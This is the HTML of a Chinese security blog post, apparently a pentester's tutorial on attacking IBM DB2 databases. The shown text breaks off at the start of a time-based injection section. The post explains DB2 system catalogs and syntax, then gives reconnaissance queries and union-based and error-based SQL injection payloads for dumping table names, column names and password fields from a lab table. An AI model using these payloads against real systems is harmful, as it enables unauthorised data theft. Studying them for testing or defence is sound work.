@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>攻击数据库之db2 | hungry and humble</title>
+    
+    
+        <meta name="keywords" content="注入" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="环境创建表 1234567create table TEST(id varchar(200),USERNAME VARCHAR(200),PASSWORD VARCHAR(200))INSERT INTO TEST VALUES (&amp;#x27;ADMIN&amp;#x27;,&amp;#x27;ADMIN&amp;#x27;)INSERT INTO TEST VALUES (&amp;#x27;2&amp;#x27;,&amp;#x27;TES">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻击数据库之db2">
+<meta property="og:url" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/index.html">
+<meta property="og:site_name" content="hungry and humble">
+<meta property="og:description" content="环境创建表 1234567create table TEST(id varchar(200),USERNAME VARCHAR(200),PASSWORD VARCHAR(200))INSERT INTO TEST VALUES (&amp;#x27;ADMIN&amp;#x27;,&amp;#x27;ADMIN&amp;#x27;)INSERT INTO TEST VALUES (&amp;#x27;2&amp;#x27;,&amp;#x27;TES">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/1.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/2.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/3.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/4.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/5.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/6.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/7.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/8.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/9.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/10.png">
+<meta property="og:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/11.png">
+<meta property="article:published_time" content="2020-12-08T11:02:22.000Z">
+<meta property="article:modified_time" content="2021-12-08T13:14:48.672Z">
+<meta property="article:author" content="G7shot">
+<meta property="article:tag" content="注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://little-gu.github.io/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/1.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="hungry and humble" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/ckrie.jpg" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">hungry and humble</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">index</a>
+                
+                    <a class="main-nav-link" href="/archives">archives</a>
+                
+                    <a class="main-nav-link" href="/about">about</a>
+                
+                    <a class="main-nav-link" href="/notes">notes</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">index</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">archives</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">about</a></td>
+                
+                    <td><a class="main-nav-link" href="/notes">notes</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            .net
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/25/viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98/">viewstate反序列化实战</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            PHP代码审计
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/02/13/zzzcms/">zzzcms前台RCE</a></li>  <li class="file"><a href="/2020/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/">审计某cms到insert注入技巧</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Python
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/12/02/github%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E6%B5%8B%E8%AF%95/">github泄露工具测试</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            java
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/02/16/cc1%E9%93%BE/">cc1链</a></li>  <li class="file"><a href="/2020/03/19/cc2%E9%93%BE/">cc2链</a></li>  <li class="file"><a href="/2020/04/19/cc5%E9%93%BE/">cc5链</a></li>  <li class="file"><a href="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/">结合两条cc链分析ysoserial实现</a></li>  <li class="file"><a href="/2021/10/09/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/">fastjson不出网利用</a></li>  <li class="file"><a href="/2021/12/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%BF%E4%B8%8Bjava%E7%AB%99%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%A7%A3%E5%86%B3/">记一次拿下java站之后的负载均衡解决</a></li>  <li class="file"><a href="/2021/12/07/java%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">java发序列化执行任意类的利用</a></li>  <li class="file"><a href="/2022/01/08/%E5%88%A9%E7%94%A8urldns%E5%8E%9F%E7%94%9F%E9%93%BE%E6%8E%A2%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E7%9B%B8%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E9%93%BE/">利用urldns原生链探测是否存在相应版本的反序列链</a></li>  <li class="file"><a href="/2022/01/10/log4j2%E6%9D%82%E8%B0%88/">log4j2杂谈</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            注入
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/03/04/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bmssql/">攻击数据库之mssql</a></li>  <li class="file active"><a href="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/">攻击数据库之db2</a></li>  <li class="file"><a href="/2021/12/05/%E8%8B%9B%E5%88%BB%E7%8E%AF%E5%A2%83%E4%B8%8Bmssql%E6%B3%A8%E5%85%A5/">苛刻环境下mssql注入</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            渗透
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/">non-rce-ctf复现</a></li>  <li class="file"><a href="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/">记一次曲折渗透selenium-server</a></li>  <li class="file"><a href="/2021/12/03/%E5%AE%9E%E6%88%98host%E7%A2%B0%E6%92%9E%E5%88%B0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">实战host碰撞到代码审计</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/2021/02/13/test/">test</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-攻击数据库之db2" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E6%B3%A8%E5%85%A5/">注入</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/">
+            <time datetime="2020-12-08T11:02:22.000Z" itemprop="datePublished">2020-12-08</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/raw/writing/source/_posts/攻击数据库之db2.md'> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/edit/writing/source/_posts/攻击数据库之db2.md'> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/commits/writing/source/_posts/攻击数据库之db2.md'> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            攻击数据库之db2
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>创建表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> TEST(id <span class="type">varchar</span>(<span class="number">200</span>),USERNAME <span class="type">VARCHAR</span>(<span class="number">200</span>),PASSWORD <span class="type">VARCHAR</span>(<span class="number">200</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TEST <span class="keyword">VALUES</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;ADMIN&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TEST <span class="keyword">VALUES</span> (<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;TEST&#x27;</span>,<span class="string">&#x27;TEST&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TEST <span class="keyword">VALUES</span> (<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;sysop&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> syscat.tables <span class="keyword">where</span> TABNAME<span class="operator">=</span><span class="string">&#x27;TEST111&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="数据库体系"><a href="#数据库体系" class="headerlink" title="数据库体系"></a>数据库体系</h2><p>系统–实例–数据库–schema–table</p>
+<p>在 Oracle 中每个实例只能有一个数据库，而在 DB2 中多个数据库可以共享一个实例。（Oracle一个实例对应一个数据库）<br><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/1.png" alt="1"><br>database是一个connection的目标对象，也就是说用户发起一个DB2连接时，指的是连接到到一个database，而不是连接到一个instance，也不是连接到一个schema。<br><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/2.png" alt="2"></p>
+<p>如果把database看作是一个仓库，仓库很多房间（schema），一个schema代表一个房间，table可以看作是每个房间中的储物柜，user是每个schema的主人，有操作数据库中每个房间的权利，就是说每个数据库映射user有每个schema（房间）的钥匙。</p>
+<p>在没有操作别的schema的操作根权下，每个用户只能操作它自己的schema下的所有的表。</p>
+<p>每一个DB2授权用户都有一个对应的schema，其名字和用户名相同；当然也可以再创建新的schema；这样DB2中user和schema是一种一对多的关系，而Oracle中是一对一的关系。</p>
+<p>数据库架构和语法感觉类似sqlserver</p>
+<p>查看当前存在的schema<br><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/3.png" alt="3"><br>SYSIBM: 基本系统编目<br>SYSCAT: 只读编目视图,一般通过这个来获取编目信息<br>SYSSTAT: 可更新编目视图,会影响优化器的优化策略<br>SYSFUN: 用户定义函数<br>SYSPROC: 存放一组系统的存储过程,下面用到的ADMIN_CMD存储过程就在这个里面<br>SYSIBMADM：一组动态性能视图，可以从该组视图中获取数据库的性能运行信息。</p>
+<p>比如查看当前用户默认的schema和user<br><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/4.png" alt="4"></p>
+<h3 id="系统表"><a href="#系统表" class="headerlink" title="系统表"></a>系统表</h3><p>在创建db2数据库的时候，会创建一些系统表，这些表记录了所有数据库的对象（表、视图等），它们都在模式sysibm下面，并且均以sys开头，如systables、sysviews、sysindexes等，同时也为这些表建立了相应的视图，这些视图在模式syscat下面。</p>
+<p>sysibm 系统数据字典表(基本表)<br>syscat 系统视图<br>sysibm.sysdummy1表相当于Oracle里的伪表。</p>
+<ul>
+<li>syscat.columns</li>
+<li>syscat.tables</li>
+</ul>
+<p>每一行代表一张表，视图，别名或昵称</p>
+<p>sysibm.systables:系统为每一个表，视图和别名在该表中创建一行记录。<br>sysibm.syscolumns:表中存放系统中所有表的数据列的描述信息，系统为db2里定义的每个表的每一行建立一条记录。</p>
+<p>问题：<br>数据库的视图里有sysibm.tables和syscat.tables，这两个有什么区别？<br>sysibm.tables的表里面的信息比syscat.tables的少，或者说IBM认为你想知道的信息在sysibm.tables里面已经都可以知道了，这个应该是给用户使用的。syscat.tables应该是给系统使用的。</p>
+<ul>
+<li>查询所有表<br>以前版本 select * from syscat.systables where Type = ‘T’</li>
+</ul>
+<p>11.1        select * from syscat.tables where Type = ‘T’</p>
+<ul>
+<li><p>查询所有schema<br>SELECT * FROM SYSIBM.SYSSCHEMA<br>SELECT * FROM SYSIBM.SYSSCHEMATA</p>
+</li>
+<li><p>查询用户和权限<br>用户： select * from syscat.dbauth<br>权限： select * from syscat.tabauth<br>判断是否是dba权限<br>SELECT (CASE WHEN ((SELECT dbadmauth FROM syscat.dbauth WHERE grantee=current user)=’Y’) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1</p>
+</li>
+</ul>
+<p>查找当前schema所有表<br>select TABLENAME from syscat.tables where TABSCHEMA=CURRENT SCHEMA</p>
+<p>查看当前schema所有列<br>select * from sysibm.syscolumns WHERE TBNAME=’TEST111’</p>
+<p>查找当前schema字段值<br>SELECT TABSCHEMA,TABNAME FROM SYSCAT.COLUMNS WHERE COLNAME=’COLNAME’</p>
+<p>获取数据库用户名称<br>select distinct owner from syscat.tables where tabschema=current schema<br>自己搭的环境应该没有配置用户返回空<br><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/5.png" alt="5"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM SYSCAT.COLUMNS WHERE TABNAME&#x3D;&#39;TEST&#39; AND TABSCHEMA&#x3D;&#39;DB2ADMIN&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
+<li><p>DB2 数据库一旦创建就无法再修改字符集的编码方式。</p>
+</li>
+<li><p>windows和linux的区别</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DB2的所有用户都是操作系统用户，且用户密码也与操作系统中该用户的密码绑定。</span><br><span class="line">Linux下，安装DB2会创建db2inst1，db2fenc1和dasusr1三个用户。</span><br><span class="line">Windows下，会创建db2admin用户并将其添加到管理员组。</span><br><span class="line">本地操作系统用户并不全为DB2用户，需要在DB2管理功能中添加操作系统用户为数据库用户。</span><br></pre></td></tr></table></figure></li>
+<li><p>关于权限<br><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/6.png" alt="6"></p>
+</li>
+</ul>
+<p>get authorizations<br><a target="_blank" rel="noopener" href="https://blog.51cto.com/11310506/2090728">https://blog.51cto.com/11310506/2090728</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaojianblogs/p/6874299.html">https://www.cnblogs.com/xiaojianblogs/p/6874299.html</a></p>
+<p>select * from syscat.tabauth</p>
+<p>当前用户权限get authorizations</p>
+<ul>
+<li><p>关于大小写<br>DB2中表名是分大小写的</p>
+</li>
+<li><p>关于limit<br>使用 fetch first 10 rows only 限制返回的行数，DB2 i 7.1和7.2添加了对OFFSET和LIMIT的支持。</p>
+</li>
+<li><p>关于union</p>
+<ol>
+<li>联合查询需要跟一个表名</li>
+<li>9.7版本前后差异</li>
+</ol>
+</li>
+</ul>
+<p>9.7版本之后可以直接用null（这里的null被认为是varchar类型）。<br>9.7版本之前可以写cast (null as int)或者null||’’，明确指定null的类型。<br>早期版本是强类型的必须指定null类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例：select ID,USERNAME,PASSWORD from TEST111 where 1&#x3D;1 union select cast(NULL as int) as A,cast(NULL as varchar(128)) as B,cast(NULL as varchar(128)) as C from test111</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注释 – /**/</li>
+<li>截取字符串 substr(‘abc’,2,1)</li>
+<li>字符串连接 ‘a’||’a’||’a’或’a’ concat ‘a’ concat ‘a’或concat(‘a’,’a’)</li>
+<li>字符串长度 length()</li>
+<li>DB2不支持堆叠 tatement1; statement2</li>
+<li>常用函数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COALESCE()   返回第一个非空参数</span><br><span class="line">CAST 类型转换函数 SELECT CAST(CURRENT TIME AS CHAR(8) ) FROM SYSIBM.SYSDUMMY1</span><br><span class="line">CHAR() CHAR函数返回日期时间型、字符串、整数、十进制或双精度浮点数的字符串表示。</span><br><span class="line">CHR() CHR函数返回由参数指定的ASCII码的字符，参数可以是INTEGER或SMALLINT。</span><br><span class="line">substr(&#39;abc&#39;,2,1)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>条件语句 SELECT CASE WHEN (1=1) THEN ‘AA’ ELSE ‘BB’ END FROM sysibm.sysdummy1</li>
+</ul>
+<h2 id="db2信息收集"><a href="#db2信息收集" class="headerlink" title="db2信息收集"></a>db2信息收集</h2><ul>
+<li>端口50000</li>
+</ul>
+<ol>
+<li>判断数据库</li>
+</ol>
+<p>and (select count(versionnumber) from sysibm.sysversions)&gt;0 返回正常</p>
+<p>报错，类似+331 01520   -534 21502</p>
+<ol start="2">
+<li><p>判断数据库版本<br>SELECT service_level FROM table(sysproc.env_get_inst_info()) as instanceinfo</p>
+</li>
+<li><p>获取用户权限</p>
+</li>
+</ol>
+<p>SELECT * FROM syscat.tabauth where grantee = current user</p>
+<ol start="4">
+<li>数据库所在主机相关信息</li>
+</ol>
+<p>SELECT  OS_FULL_VERSION FROM sysibmadm.env_sys_info</p>
+<ol start="5">
+<li>获取当前数据库</li>
+</ol>
+<p>SELECT current server FROM sysibm.sysdummy1</p>
+<ol start="6">
+<li>获取当前用户</li>
+</ol>
+<p>SELECT user FROM sysibm.sysdummy1<br>SELECT session_user FROM sysibm.sysdummy1<br>SELECT system_user FROM sysibm.sysdummy1</p>
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><ul>
+<li>union select null,null,null from sysibm.systables联合注入需要跟表名</li>
+<li>对应字段类型必须一样</li>
+</ul>
+<ol>
+<li><p>order by 判断字段数</p>
+</li>
+<li><p>联合查询判断当前schema</p>
+</li>
+</ol>
+<p>SELECT USERNAME,PASSWORD FROM TEST111 WHERE ID=1 UNION SELECT null,CURRENT SCHEMA FROM sysibm.sysdummy1<br><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/7.png" alt="7"></p>
+<ol start="3">
+<li><p>利用系统表爆表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT USERNAME,PASSWORD FROM TEST WHERE ID&#x3D;1 UNION SELECT NULL,tabname from syscat.tables where tabschema&#x3D;current schema</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/8.png" alt="8"></p>
+</li>
+<li><p>爆列名</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT USERNAME,PASSWORD FROM TEST111 WHERE ID&#x3D;1 UNION SELECT NULL,column_name from sysibm.columns where table_schema&#x3D;current schema and table_name&#x3D;&#39;TEST111&#39; limit 0,2</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>爆字段值</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT USERNAME,PASSWORD FROM TEST111 WHERE ID&#x3D;1 UNION SELECT NULL,PASSWORD FROM TEST111</span><br></pre></td></tr></table></figure>
+<p>无列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select password from test where id &#x3D; -1 union select b from (select null,null,null as b from test union select * from test)a</span><br></pre></td></tr></table></figure>
+<h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><p>group by id–会显示第二列名–枚举所有列<br><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/9.png" alt="9"><br><img src="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/10.png" alt="10"></p>
+<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>使用笛卡尔积的方式通过大量运算造成延时</p>
+<p>判断</p>
